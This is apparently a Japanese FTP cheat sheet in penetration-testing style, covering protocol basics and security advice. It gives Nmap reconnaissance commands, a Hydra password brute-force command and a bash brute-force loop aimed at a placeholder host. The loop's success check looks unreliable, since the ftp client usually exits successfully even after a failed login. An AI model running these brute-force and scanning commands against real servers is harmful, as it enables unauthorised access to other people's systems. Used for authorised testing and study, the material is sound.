# FTP（File Transfer Protocol）概要と使い方

#### 概要
FTPは、ネットワーク経由でファイルを転送するための標準的なプロトコルです。デフォルトでは、21番ポートを使用してコマンド接続を確立し、データ転送は別のポートで行います。FTPは、匿名アクセスをサポートしており、ユーザーアカウントに基づいたアクセスも可能です。

#### セキュリティ上の注意点
- **認証情報の保護**: FTPは、認証情報を平文で送信します。セキュリティを高めるためには、FTPSやSFTPの使用を検討することが推奨されます。
- **匿名アクセスの制限**: 匿名アクセスを無効にし、適切なユーザー認証を要求します。
- **ファイアウォールの設定**: FTPのデータポートが開放されていることを確認し、不正アクセスを防ぐためにファイアウォールの設定を行います。

## 偵察行為

#### Nmapを使用したFTPサーバーの偵察
FTPサーバーの詳細情報を取得し、脆弱性を調査するための基本的な手順です。

```bash
# 1. 基本的なポートスキャン
nmap -p 21 ftp.example.com

# 2. FTPサービスのバージョン検出
nmap -sV -p 21 ftp.example.com

# 3. FTP特有のスクリプトを使用して脆弱性をチェック
nmap --script ftp* -p 21 ftp.example.com
```

#### `nmap`によるFTPバナー収集
FTPサーバーのバナーを収集するための手順です。

```bash
# FTPバナーの収集
nmap -p 21 --script ftp-banner ftp.example.com
```

- **--script ftp-banner**: FTPサーバーのバナーを収集するためのスクリプトです。

#### `nmap`による匿名FTPアクセスの確認
匿名FTPアクセスの有無を確認するための手順です。

```bash
# FTPサーバーに匿名ログイン
ftp ftp.example.com
# コマンドプロンプトで以下を入力
# anonymous
# [Enter]
```


#### FTPブルートフォース攻撃
FTPサーバーに対してブルートフォース攻撃を行い、認証情報を試す方法です。

```bash
# Hydraを使用したFTPブルートフォース攻撃
hydra -l username -P /path/to/passwordlist.txt ftp://ftp.example.com
```

- **-l**: 単一のユーザー名を指定します。
- **-P**: パスワードリストファイルを指定します。



#### FTPブルートフォーススクリプト
FTPサーバーに対してブルートフォース攻撃を行うための簡単なスクリプトです。

```bash
# パスワードリストを使用してブルートフォース攻撃
for password in $(cat /path/to/passwordlist.txt); do
    echo "Trying password: $password"
    ftp -inv ftp.example.com << EOF
    user username $password
    bye
EOF
    if [ $? -eq 0 ]; then
        echo "Password found: $password"
        break
    fi
done
```

- **ftp**: FTPクライアントコマンドです。
- **-i**: インタラクティブモードを無効にします。
- **-n**: 自動的なログインを無効にします。
- **-v**: 詳細な出力を表示します。


### ログイン

#### FTP接続の確立
FTPサーバーに接続し、ファイルの転送や管理を行います。

```bash
# FTP接続を確立
ftp ftp.example.com
```

- **ftp.example.com**: 接続先のホスト名またはIPアドレスを指定します。

### ログイン後

#### FTPサーバーのディレクトリリストの取得
ログイン後、FTPサーバー上のファイルやディレクトリのリストを取得します。

```bash
# ディレクトリリストの取得
ls
```

#### FTPファイルのアップロードとダウンロード
FTPサーバーにファイルをアップロードしたり、サーバーからファイルをダウンロードします。

```bash
# ファイルのアップロード
put localfile.txt remote_file.txt

# ファイルのダウンロード
get remote_file.txt localfile.txt
```

#### FTPセッションの終了
FTPセッションを終了します。

```bash
# FTPセッションの終了
bye
```

### エラーコード

### 530 Login incorrect
認証情報が間違っていることを示します。

- **原因**: ユーザー名やパスワードが間違っている可能性があります。
- **対処法**: 正しい認証情報を確認し、再度ログインを試みます。

#### 550 Requested action not taken
要求されたアクションが実行できなかったことを示します。

- **原因**: ファイルやディレクトリが存在しない、またはアクセス権限が不足している可能性があります。
- **対処法**: ファイルやディレクトリの存在を確認し、必要なアクセス権限が設定されているか確認します。
```
